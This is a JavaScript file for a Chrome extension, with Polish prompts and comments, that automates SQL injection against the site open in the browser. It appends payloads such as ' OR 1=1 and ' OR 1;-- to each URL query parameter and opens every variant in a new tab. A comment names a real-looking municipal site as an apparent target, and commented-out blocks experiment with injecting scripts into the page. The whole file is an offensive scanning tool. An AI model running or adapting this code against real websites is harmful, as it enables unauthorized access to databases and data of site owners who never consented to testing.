var tabId;
var url = "";
var tab_ids = [];

if (confirm('Chcesz przeprowadzic SQL injection na tej stronie?')) {
    chrome.tabs.getSelected(null, function (tab) {
            tabId = tab.id;
            chrome.tabs.sendMessage(tabId, {msg:"get_url"}, function (response) {
                    sj_code = ["\" OR 1 ", "\" OR 1=1 ","\' OR 1 ","\' OR 1;--", "\' OR 1=1 ", " OR 1=1", " OR 1"];//, "\" OR 1;", "\" OR 1=1;","\' OR 1 ", "\' OR 1=1 ", "\' OR 1;", "\' OR 1=1;"];
                    url = response.ans;
                    if (url.indexOf("?") == -1) {
                        alert("nie ma '?' w adresie!");
                    }
                    else {
                        splited = url.split("&");
                        beggining = splited[0];

                        for(i=1;i<=splited.length;i++){
                            for(j=0;j<sj_code.length;j++){
                                bad_url = beggining + sj_code[j];
                                for(k=i;k<splited.length;k++){
                                    bad_url+="&";
                                    bad_url+=splited[k];
                                }
                                chrome.tabs.create({url:bad_url},function(tab){
                                    tab_ids[i*sj_code.length + j]=tab.id;
                                });
                            }
                            beggining+="&";
                            beggining+=splited[i];
                        }
                    }
                }
            )
        }
    )
}
//http://grudziadz.com.pl/index.php?op=showart\/
// &id=6012\/


/*
 chrome.tabs.getSelected(null, function (tab) {
 tabId = tab.id;
 //chrome.tabs.sendMessage(tabId, {msg: "inject_file", file_name: "jquery.js"});

 chrome.tabs.sendMessage(tabId, {msg:"inject_file", file_name:"jquery.js"}, function (response) {
 alert("jquery wrzucone");
 chrome.tabs.sendMessage(tabId, {msg:"get_inputs_names"}, function (response_with_inputs) {
 var list = response_with_inputs.ans;
 amount = list.length;

 for(i =0;i<amount;i++){
 chrome.tabs.duplicate(tabId, function (duplicated_tab) {
 tab_ids[i] = duplicated_tab.id;
 chrome.tabs.sendMessage(tab_ids[i], {msg:"inject_code", code:"alert('"+i+"');"});
 //chrome.tabs.sendMessage(tab_ids[i], {msg:"inject_code", code:code_to_inject_to_all_pages});
 });
 }
 });
 });

 });
 */
/*
 chrome.tabs.sendMessage(tab.id, {msg:"get_inputs"}, function (response) {
 alert("dostalem: " + response.ans.length + " inputow");
 code_to_inject_to_all_pages = ""
 for (i = 0; i < response.ans.length; i++)
 code_to_inject_to_all_pages += "$('[name=" + response.ans[i].name + "]').val(\"" + response.ans[i].value + "\");";
 alert(code_to_inject_to_all_pages);

 for (i = 0; i < response.ans.length; i++) {
 /*
 chrome.tabs.create({'url':url}, function (tab) {
 chrome.tabs.sendMessage(tab.id, {msg:"inject_file", file_name:"jquery.js"},function(response){
 chrome.tabs.sendMessage(tab.id, {msg:"inject_code", code:"$('body').css('background-color','red');"});
 });


 });* /
 chrome.tabs.duplicate(tabId, function (duplicated_tab) {
 tab_ids[i] = duplicated_tab.id;
 alert(tab_ids[i]);
 //chrome.tabs.sendMessage(tab_ids[i], {msg:"inject_code", code:code_to_inject_to_all_pages});
 });
 }
 });
 */
//}

/*
 function start(){
 alert("aa");
 tab = chrome.tabs.getCurrent();
 alert(tab);
 alert(tad.id);
 }
 */
/*

 chrome.tabs.getSelected(null, function(tab) {
 url = tab.url;
 //if(tabId==-1){
 tabId=tab.id
 alert("ustawilem tabid");
 //chrome.tabs.highlight({tabs:tabId},function(windows.Window window){});
 //}
 do_some_magic(tab);
 });
 */
/*
 function do_some_magic(tab){
 //chrome.tabs.sendMessage(tabId, {msg: "inject_file", file_name: "jquery.js"}); // inject jquery
 //chrome.tabs.sendMessage(tabId, {msg: "inject_file", file_name: "code.js"});   // incject some js file

 //chrome.tabs.sendMessage(tabId, {msg: "inject_file", file_name: "jquery.js"},function(response){}); // inject jquery

 chrome.tabs.sendMessage(tab.id, {msg: "get_inputs"}, function(response)
 {
 alert("response" + response);
 if(typeof response === "undefined")
 return false;
 /*
 alert("lecimy dalej");
 alert("dostalem: "+response.ans.length+ " inputow");
 code_to_inject_to_all_pages = ""
 for(i=0;i<response.ans.length;i++)
 code_to_inject_to_all_pages += "$('[name="+response.ans[i].name+"]').val(\""+response.ans[i].value+"\");";

 alert(code_to_inject_to_all_pages);
 for(i=0;i<response.ans.length;i++)
 {
 //alert(response.ans[i].name+" " +response.ans[i].value);
 chrome.tabs.create({'url': url}, function(tab) {
 /*
 tab_ids[i] = tab.id;
 alert(tab.id);
 chrome.tabs.sendMessage(tab.id, {msg: "inject_file", file_name: "jquery.js"});
 alert(tab.id);
 chrome.tabs.sendMessage(tab.id, {msg: "inject_code", code: code_to_inject_to_all_pages});
 chrome.tabs.sendMessage(tab.id, {msg: "inject_code", code: "$('body').css('background-color','red');"});
 * /
 });
 }
 * /
 });
 }
 */